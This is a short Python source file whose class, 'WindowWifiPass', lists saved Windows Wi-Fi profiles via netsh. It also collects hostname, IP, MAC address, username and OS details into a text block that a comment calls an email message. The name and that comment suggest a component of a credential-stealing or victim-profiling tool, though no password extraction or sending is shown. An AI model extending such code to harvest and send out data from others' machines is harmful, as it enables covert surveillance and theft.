import  subprocess
import socket
import re
import os
import uuid

class WindowWifiPass:
    def __init__(self):
        pass
    def get_wifi_profile(self):
        try:
            output = subprocess.check_output(["netsh", "wlan", "show", "profiles"], shell=True)
            output = output.decode("utf-8")
            lines = output.split("\n")
            profile_names = []
            for line in lines:
                if "All User Profile" in line:
                    profile_names.append(line.split(":")[1].strip())
           
            return profile_names
        except Exception as e:
            return str(e)
    
    def get_devices_info(self):
        metadata = ""
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        user_name = os.getlogin()
        system_name = os.name
        system_model = subprocess.check_output(["wmic", "computersystem", "get", "model"]).decode().split("\n")[1].strip()
        operating_system = subprocess.check_output(["wmic", "os", "get", "Caption"]).decode().split("\n")[1].strip()
        operating_system_version = subprocess.check_output(["wmic", "os", "get", "Version"]).decode().split("\n")[1].strip()
         # Construct email message
        message = "*"*60+ " Device Information "+"*"*60 +"\n\n"
        message += f"Hostname: {hostname}\n"
        message += f"IP Address: {ip_address}\n"
        message += f"MAC Address: {mac_address}\n"
        message += f"User Name: {user_name}\n"
        message += f"System Name: {system_name}\n"
        message += f"System Model: {system_model}\n"
        message += f"Operating System: {operating_system}\n"
        message += f"Operating System Version: {operating_system_version}\n\n"
        message += "*"*150
        metadata += message
        return metadata
    
# wifi= WindowWifiPass()

# print(wifi.get_devices_info())
